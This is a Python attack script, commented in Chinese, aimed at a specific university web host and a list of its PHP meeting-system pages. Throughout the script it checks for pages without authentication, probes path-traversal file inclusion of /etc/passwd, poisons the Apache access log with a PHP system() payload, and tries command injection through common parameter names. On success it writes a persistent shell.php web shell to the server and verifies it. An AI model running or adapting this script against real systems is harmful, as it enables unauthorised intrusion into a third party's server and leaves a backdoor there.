#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"

# 从index中找到的文件
php_files = [
    "enmeeting/admin.php",
    "enmeeting/adduser.php", 
    "enmeeting/addsubject.php",
    "enmeeting/mobilemeeting.php",
    "enmeeting/J4P.php",
    "enmeeting/addmeeting.php",
]

print("[*] 测试所有PHP文件可访问性和漏洞...")

for php_file in php_files:
    print(f"\n[*] 测试: {php_file}")
    test_url = url + "/" + php_file
    
    # 测试GET请求
    resp = requests.get(test_url, verify=False, timeout=5)
    print(f"  GET状态: {resp.status_code}")
    
    if resp.status_code == 200:
        content = resp.text
        print(f"  响应大小: {len(content)} bytes")
        
        # 检查是否需要认证
        if "401" in content or "Authorization" in content or "login" in content.lower():
            print("  [*] 需要认证")
        else:
            print("  [+] 不需要认证!")
            
            # 测试文件包含
            test_params = ["file", "page", "include", "path"]
            for param in test_params:
                test_inc = f"{test_url}?{param}=../../../../etc/passwd"
                resp2 = requests.get(test_inc, verify=False, timeout=5)
                if "root:" in resp2.text:
                    print(f"    [+] 文件包含漏洞: {param}")
                    # 尝试日志包含
                    php_code = "<?php system($_GET['c']); ?>"
                    requests.get(f"{test_url}?{param}={php_code}", verify=False, timeout=5)
                    log_url = f"{test_url}?{param}=../../../../var/log/apache2/access.log&c=id"
                    shell_resp = requests.get(log_url, verify=False, timeout=5)
                    if "uid=" in shell_resp.text:
                        print(f"    [+] Shell获取成功: {log_url}")
                        exit(0)
            
            # 测试RCE
            test_params = ["cmd", "c", "exec", "system", "eval"]
            for param in test_params:
                test_rce = f"{test_url}?{param}=system('id');"
                resp2 = requests.get(test_rce, verify=False, timeout=5)
                if "uid=" in resp2.text:
                    print(f"    [+] RCE漏洞: {param}")
                    shell_cmd = f"file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                    shell_url = f"{test_url}?{param}={shell_cmd}"
                    requests.get(shell_url, verify=False, timeout=5)
                    test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                    if "uid=" in test_shell.text:
                        print(f"    [+] Shell获取成功: {url}/shell.php?c=id")
                        exit(0)
                
                test_rce2 = f"{test_url}?{param}=id"
                resp2 = requests.get(test_rce2, verify=False, timeout=5)
                if "uid=" in resp2.text:
                    print(f"    [+] 命令执行: {param}")
                    shell_cmd = "echo '<?php system($_GET[c]); ?>' > shell.php"
                    shell_url = f"{test_url}?{param}={shell_cmd}"
                    requests.get(shell_url, verify=False, timeout=5)
                    test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                    if "uid=" in test_shell.text:
                        print(f"    [+] Shell获取成功: {url}/shell.php?c=id")
                        exit(0)

print("\n[-] 所有文件测试完成")
